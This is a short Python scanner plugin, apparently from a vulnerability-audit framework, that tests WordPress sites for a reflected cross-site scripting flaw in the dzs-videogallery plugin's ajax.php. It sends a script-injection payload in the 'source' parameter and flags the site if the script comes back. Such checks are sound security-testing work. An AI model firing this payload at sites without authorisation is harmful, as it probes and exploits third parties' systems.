#Referer:http://sebug.net/vuldb/ssvid-61532
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(args):
    payload = "/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&amp;height=400&amp;"
    payload +="width=610&amp;type=vimeo&amp;source=%22/><script>alert(233)</script>"
    verify_url = args + payload
    code, head, content, errcode,finalurl = curl.curl(verify_url)
    if code==200 and '<script>alert(233)</script>' in content:
        security_info(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
